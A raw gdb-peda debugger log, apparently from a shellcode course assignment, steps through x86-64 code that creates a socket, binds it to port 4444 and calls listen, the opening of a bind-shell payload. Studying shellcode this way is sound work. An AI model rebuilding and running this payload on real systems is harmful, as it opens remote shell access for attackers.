   0x601064 <code+4>:	push   0x2
   0x601066 <code+6>:	pop    rdi
   0x601067 <code+7>:	push   0x1
   0x601069 <code+9>:	pop    rsi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601063 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x29 (')')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x601064 --> 0x50f5e016a5f026a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105f:	add    BYTE PTR [rdx+0x29],ch
   0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
=> 0x601064 <code+4>:	push   0x2
   0x601066 <code+6>:	pop    rdi
   0x601067 <code+7>:	push   0x1
   0x601069 <code+9>:	pop    rsi
   0x60106a <code+10>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601064 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x29 (')')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x2 
RIP: 0x601066 --> 0x9748050f5e016a5f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	push   0x2
=> 0x601066 <code+6>:	pop    rdi
   0x601067 <code+7>:	push   0x1
   0x601069 <code+9>:	pop    rsi
   0x60106a <code+10>:	syscall 
   0x60106c <code+12>:	xchg   rdi,rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x2 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601066 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x29 (')')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x601067 --> 0x529748050f5e016a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	push   0x2
   0x601066 <code+6>:	pop    rdi
=> 0x601067 <code+7>:	push   0x1
   0x601069 <code+9>:	pop    rsi
   0x60106a <code+10>:	syscall 
   0x60106c <code+12>:	xchg   rdi,rax
   0x60106e <code+14>:	push   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601067 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x29 (')')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x1 
RIP: 0x601069 --> 0x4c7529748050f5e 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601064 <code+4>:	push   0x2
   0x601066 <code+6>:	pop    rdi
   0x601067 <code+7>:	push   0x1
=> 0x601069 <code+9>:	pop    rsi
   0x60106a <code+10>:	syscall 
   0x60106c <code+12>:	xchg   rdi,rax
   0x60106e <code+14>:	push   rdx
   0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x1 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601069 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x29 (')')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x60106a --> 0x2404c7529748050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601066 <code+6>:	pop    rdi
   0x601067 <code+7>:	push   0x1
   0x601069 <code+9>:	pop    rsi
=> 0x60106a <code+10>:	syscall 
   0x60106c <code+12>:	xchg   rdi,rax
   0x60106e <code+14>:	push   rdx
   0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
   0x601076 <code+22>:	mov    rsi,rsp
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106a in code ()
gdb-peda$ 
















[----------------------------------registers-----------------------------------]
RAX: 0x3 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x0 
RSI: 0x1 
RDI: 0x2 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x60106c --> 0x22404c7529748 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601067 <code+7>:	push   0x1
   0x601069 <code+9>:	pop    rsi
   0x60106a <code+10>:	syscall 
=> 0x60106c <code+12>:	xchg   rdi,rax
   0x60106e <code+14>:	push   rdx
   0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
   0x601076 <code+22>:	mov    rsi,rsp
   0x601079 <code+25>:	push   0x10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106c in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x0 
RSI: 0x1 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x60106e --> 0x5c1100022404c752 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601069 <code+9>:	pop    rsi
   0x60106a <code+10>:	syscall 
   0x60106c <code+12>:	xchg   rdi,rax
=> 0x60106e <code+14>:	push   rdx
   0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
   0x601076 <code+22>:	mov    rsi,rsp
   0x601079 <code+25>:	push   0x10
   0x60107b <code+27>:	pop    rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106e in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x0 
RSI: 0x1 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x0 
RIP: 0x60106f --> 0x485c1100022404c7 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106a <code+10>:	syscall 
   0x60106c <code+12>:	xchg   rdi,rax
   0x60106e <code+14>:	push   rdx
=> 0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
   0x601076 <code+22>:	mov    rsi,rsp
   0x601079 <code+25>:	push   0x10
   0x60107b <code+27>:	pop    rdx
   0x60107c <code+28>:	push   0x31
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x0 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060106f in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x0 
RSI: 0x1 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601076 --> 0x316a5a106ae68948 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106c <code+12>:	xchg   rdi,rax
   0x60106e <code+14>:	push   rdx
   0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
=> 0x601076 <code+22>:	mov    rsi,rsp
   0x601079 <code+25>:	push   0x10
   0x60107b <code+27>:	pop    rdx
   0x60107c <code+28>:	push   0x31
   0x60107e <code+30>:	pop    rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601076 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x0 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601079 --> 0x50f58316a5a106a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106e <code+14>:	push   rdx
   0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
   0x601076 <code+22>:	mov    rsi,rsp
=> 0x601079 <code+25>:	push   0x10
   0x60107b <code+27>:	pop    rdx
   0x60107c <code+28>:	push   0x31
   0x60107e <code+30>:	pop    rax
   0x60107f <code+31>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601079 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x0 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x10 
RIP: 0x60107b --> 0x326a050f58316a5a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60106f <code+15>:	mov    DWORD PTR [rsp],0x5c110002
   0x601076 <code+22>:	mov    rsi,rsp
   0x601079 <code+25>:	push   0x10
=> 0x60107b <code+27>:	pop    rdx
   0x60107c <code+28>:	push   0x31
   0x60107e <code+30>:	pop    rax
   0x60107f <code+31>:	syscall 
   0x601081 <code+33>:	push   0x32
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x10 
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107b in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x10 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60107c --> 0x58326a050f58316a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601076 <code+22>:	mov    rsi,rsp
   0x601079 <code+25>:	push   0x10
   0x60107b <code+27>:	pop    rdx
=> 0x60107c <code+28>:	push   0x31
   0x60107e <code+30>:	pop    rax
   0x60107f <code+31>:	syscall 
   0x601081 <code+33>:	push   0x32
   0x601083 <code+35>:	pop    rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107c in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x2 
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x10 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x31 ('1')
RIP: 0x60107e --> 0x50f58326a050f58 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601079 <code+25>:	push   0x10
   0x60107b <code+27>:	pop    rdx
   0x60107c <code+28>:	push   0x31
=> 0x60107e <code+30>:	pop    rax
   0x60107f <code+31>:	syscall 
   0x601081 <code+33>:	push   0x32
   0x601083 <code+35>:	pop    rax
   0x601084 <code+36>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x31 ('1')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107e in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x31 ('1')
RBX: 0x0 
RCX: 0x60106c --> 0x22404c7529748 
RDX: 0x10 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60107f --> 0x48050f58326a050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107b <code+27>:	pop    rdx
   0x60107c <code+28>:	push   0x31
   0x60107e <code+30>:	pop    rax
=> 0x60107f <code+31>:	syscall 
   0x601081 <code+33>:	push   0x32
   0x601083 <code+35>:	pop    rax
   0x601084 <code+36>:	syscall 
   0x601086 <code+38>:	xor    rsi,rsi
Guessed arguments:
arg[0]: 0x3 
arg[1]: 0x7fffffffe490 --> 0x5c110002 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060107f in code ()
gdb-peda$ 














[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601081 --> 0xf63148050f58326a 
RDX: 0x10 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601081 --> 0xf63148050f58326a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107c <code+28>:	push   0x31
   0x60107e <code+30>:	pop    rax
   0x60107f <code+31>:	syscall 
=> 0x601081 <code+33>:	push   0x32
   0x601083 <code+35>:	pop    rax
   0x601084 <code+36>:	syscall 
   0x601086 <code+38>:	xor    rsi,rsi
   0x601089 <code+41>:	push   0x2b
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601081 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601081 --> 0xf63148050f58326a 
RDX: 0x10 
RSI: 0x7fffffffe490 --> 0x5c110002 
RDI: 0x3 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x32 ('2')
RIP: 0x601083 --> 0x2b6af63148050f58 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107e <code+30>:	pop    rax
   0x60107f <code+31>:	syscall 
   0x601081 <code+33>:	push   0x32
=> 0x601083 <code+35>:	pop    rax
   0x601084 <code+36>:	syscall 
   0x601086 <code+38>:	xor    rsi,rsi
   0x601089 <code+41>:	push   0x2b
   0x60108b <code+43>:	pop    rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x32 ('2')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
